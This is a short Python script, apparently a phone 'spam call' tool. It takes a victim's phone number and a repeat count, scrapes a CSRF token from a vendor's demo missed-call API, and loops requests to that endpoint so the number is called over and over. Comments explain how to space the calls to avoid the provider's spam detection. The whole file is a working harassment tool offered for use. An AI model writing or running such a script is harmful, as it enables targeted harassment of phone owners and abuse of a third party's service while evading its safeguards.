import time, re, sys
from requests import Session
s = Session()

print("Welcome!")
print("User input below!")
try:
	no = int(input("(Phone-Number) -> "))
	jml = int(input("SpamCall-Count -> "))
	print()
except:
	print("\n\t* Only Number *")
	sys.exit()
	
url = "https://www.citcall.com/demo/misscallapi.php" # THIS IS WHAT IS USED TO SPAM CALL THE NUMBER... btw <3

tkn = s.get(url).text
token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]

headers = {
	'x-requested-with':'XMLHttpRequest'
}
data = {
'cid':no,
'trying':'0',
'csrf_token':token
}

n = 0
try:
	while n < jml:
		send = s.post(url, data=data, headers=headers).text
		time.sleep(30) # Delay for 2 seconds (just so the number doesn't get marked as spam by the provider) (you can edit the number to 1 to get called every second)
		if 'Success' in send:
			n +=1
			print(f"[{n}] Sended to => {no}")
		else:
			print("\n\t* Limit *")
			print("\n\t* Try one hour ago or try tomorrow *")
			break
except:
	print("\n\t* ERROR *")
	sys.exit()
